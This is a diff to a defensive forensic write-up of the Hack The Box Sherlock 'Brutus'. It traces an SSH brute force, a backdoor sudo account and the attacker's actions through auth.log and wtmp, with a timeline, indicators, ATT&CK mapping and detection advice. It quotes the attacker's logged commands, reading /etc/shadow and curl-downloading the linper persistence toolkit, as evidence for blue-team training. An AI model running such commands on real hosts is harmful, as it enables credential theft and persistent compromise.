@@ -1,6 +1,5 @@
 # Hack The Box — Sherlock: Brutus
 
-
 | Field | Value |
 |---|---|
 | Platform | Hack The Box — Sherlocks |
@@ -23,7 +22,7 @@ A Confluence server running on an AWS Ubuntu instance was the target of an SSH b
 
 | File | Type | SHA-256 | Notes |
 |---|---|---|---|
-| `Brutus.zip` | Archive (password `hacktheblue`) | stored in local `hashes.txt` | Original archive, hashed before extraction |
+| `Brutus.zip` | Archive (password `hacktheblue`) | `dd7742375a19b6ccc4323058224460a5220c43d4e9f7565b653bd369b8c46b2d` | Original archive, hashed before extraction |
 | `auth.log` | Text log (syslog format, no year) | — | sshd, PAM, CRON, sudo, useradd/groupadd/usermod events |
 | `wtmp` | Binary login records | — | Two boots: 2024-01-25 (kernel 6.2.0-1017-aws) and 2024-03-06 (kernel 6.2.0-1018-aws) |
 | `utmp.py` | Python parser | — | Converts `wtmp` to readable records |
@@ -71,7 +70,11 @@ grep -E "Failed password|Invalid user" extracted/auth.log \
   | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn
 ```
 
-The failures come from `65.2.161.68`, packed into a few seconds just before 06:31:40 and cycling through usernames (`admin`, `backup`, `server_adm`, `root`, …): the pattern of an automated tool, not a person mistyping a password. It is the same address that shows up in `wtmp` only on the day of the incident.
+```text
+     82 from 65.2.161.68
+```
+
+Every failure comes from a single address, the same `65.2.161.68` that shows up in `wtmp` only on the day of the incident. The burst is short and dense: the first `Invalid user admin` is at 06:31:31, the last failure at 06:31:42, and in between sshd starts dropping connections because of `MaxStartups` throttling (21 connections dropped). The usernames tried (`admin`, `backup`, `server_adm`, `svc_account`, `root`) look like a generic wordlist.
 
 **Answer:** `65.2.161.68`
 
@@ -84,9 +87,9 @@ grep "65.2.161.68" extracted/auth.log | grep "Accepted"
 ```
 
 ```text
-Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port ... ssh2
-Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port ... ssh2
-Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port ... ssh2
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
 ```
 
 **Answer:** `root`
@@ -132,6 +135,7 @@ Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: nam
 Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
 Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
 Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
+Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
 Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
 Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
 ```
@@ -157,8 +161,8 @@ grep -E "sshd\[2491\]|session 37" extracted/auth.log
 ```
 
 ```text
-Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port ...:11: disconnected by user
-Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port ...
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
 Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
 Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
 Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
@@ -181,7 +185,7 @@ Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberj
 Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
 
-First the attacker tests the new privileges by reading `/etc/shadow`, then downloads **linper**, a public Linux persistence toolkit: a sign they intended to plant more backdoors.
+Two commands. The first dumps `/etc/shadow` (password hashes of every local account). The second downloads `linper.sh`, a public Linux persistence toolkit: the attacker was preparing further, more durable persistence. The log only shows the download; whether the script was then run is not visible in `auth.log`.
 
 **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
@@ -191,18 +195,18 @@ First the attacker tests the new privileges by reading `/etc/shadow`, then downl
 |---|---|---|
 | 2024-03-06 06:17:15 | Host boots (kernel 6.2.0-1018-aws) | `wtmp` BOOT_TIME |
 | 2024-03-06 06:19:55 | Legitimate admin login as root from `203.101.190.9` (pts/0) | `wtmp` |
-| 2024-03-06 06:31 (seconds before 06:31:40) | Brute force from `65.2.161.68` starts | `auth.log` Failed password / Invalid user |
+| 2024-03-06 06:31:31 | Brute force from `65.2.161.68` starts (`admin`, `backup`, `server_adm`, `svc_account`, `root`) | `auth.log` Invalid user / Failed password |
 | 2024-03-06 06:31:40 | Password for `root` guessed; tool logs in and out in the same second | `auth.log` sshd[2411] |
 | 2024-03-06 06:32:44 | Attacker authenticates as root; session 37 opened | `auth.log` sshd[2491], systemd-logind |
 | 2024-03-06 06:32:45 | Interactive terminal pts/1 allocated | `wtmp` USER |
 | 2024-03-06 06:34:18 | Account `cyberjunkie` created (UID/GID 1002) | `auth.log` groupadd[2586], useradd[2592] |
 | 2024-03-06 06:34:26 | Password set for `cyberjunkie` | `auth.log` passwd[2603] |
 | 2024-03-06 06:35:15 | `cyberjunkie` added to `sudo` group | `auth.log` usermod[2628] |
-| 2024-03-06 06:37:24 | Session 37 ends | `auth.log` sshd[2491] / Removed session 37; `wtmp` DEAD pts/1 |
-| 2024-03-06 06:37:34 | Attacker authenticates as `cyberjunkie` | `auth.log` sshd[2667] |
+| 2024-03-06 06:37:24 | Session 37 ends | `wtmp` DEAD pts/1; `auth.log` Removed session 37 |
+| 2024-03-06 06:37:34 | Attacker authenticates as `cyberjunkie`; session 49 opened | `auth.log` sshd[2667], systemd-logind |
 | 2024-03-06 06:37:35 | Terminal pts/1 allocated for `cyberjunkie` | `wtmp` USER pts/1 |
-| 2024-03-06 06:37:57 | `sudo cat /etc/shadow` | `auth.log` sudo |
-| 2024-03-06 06:39:38 | `sudo curl` downloads `linper.sh` (persistence toolkit) | `auth.log` sudo |
+| 2024-03-06 06:37:57 | `sudo cat /etc/shadow` | `auth.log` sudo COMMAND= |
+| 2024-03-06 06:39:38 | `sudo curl` downloads `linper.sh` (persistence toolkit) | `auth.log` sudo COMMAND= |
 
 ## Indicators of compromise
 
@@ -212,7 +216,7 @@ First the attacker tests the new privileges by reading `/etc/shadow`, then downl
 | Account | `root` | Compromised by password guessing |
 | Account | `cyberjunkie` (GID 1002) | Backdoor account created for persistence, given sudo rights |
 | URL | `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | Persistence toolkit downloaded via `sudo curl` |
-| Command | `/usr/bin/cat /etc/shadow` | Credential access via `sudo` from the backdoor account |
+| Command | `/usr/bin/cat /etc/shadow` | Credential dump via `sudo` from the backdoor account |
 
 ## MITRE ATT&CK mapping
 
@@ -222,7 +226,7 @@ First the attacker tests the new privileges by reading `/etc/shadow`, then downl
 | Initial Access / Persistence | T1078.003 — Valid Accounts: Local Accounts | Interactive login as `root` with the guessed password (Tasks 2–3) |
 | Persistence | T1136.001 — Create Account: Local Account | `groupadd`/`useradd` for `cyberjunkie` at 06:34:18 (Task 5) |
 | Persistence / Privilege Escalation | T1098.007 — Account Manipulation: Additional Local or Domain Groups | `cyberjunkie` added to `sudo` (Task 5) |
-| Credential Access | T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow | `sudo cat /etc/shadow` at 06:37:57 |
+| Credential Access | T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow | `sudo cat /etc/shadow` at 06:37:57 (Task 8) |
 | Command and Control | T1105 — Ingress Tool Transfer | `sudo curl` of `linper.sh` at 06:39:38 (Task 8) |
 
 ## Detection and response
@@ -232,7 +236,7 @@ First the attacker tests the new privileges by reading `/etc/shadow`, then downl
 - **Success after failures (detect).** An `Accepted password` from an IP that just produced a burst of failures should be a high-severity alert, not a log line.
 - **Account creation and group changes (detect).** `useradd` / `usermod -aG sudo` on a server are rare events. Alerting on them (auditd rules on `/etc/passwd`, `/etc/group`, `/etc/sudoers*`, or the shadow-utils log lines) catches persistence even after a successful login.
 - **sudo by a brand-new account (detect).** A user created minutes earlier running `sudo` with a download tool is high-confidence malicious.
-- **Response.** Block `65.2.161.68`; disable and remove `cyberjunkie` and check `/etc/sudoers.d/`, `authorized_keys`, crontabs and systemd units for further persistence; rotate the root password and any secrets on the host; review what the `sudo` command fetched and executed; treat the host as compromised and rebuild from a known-good image if the downloaded script ran.
+- **Response.** Block `65.2.161.68`; disable and remove `cyberjunkie` and check `/etc/sudoers.d/`, `authorized_keys`, crontabs and systemd units for further persistence; rotate every local password, since `/etc/shadow` was read, along with any other secrets on the host; review what the `sudo` command fetched and executed; treat the host as compromised and rebuild from a known-good image if the downloaded script ran.
 
 ## Lessons learned
 
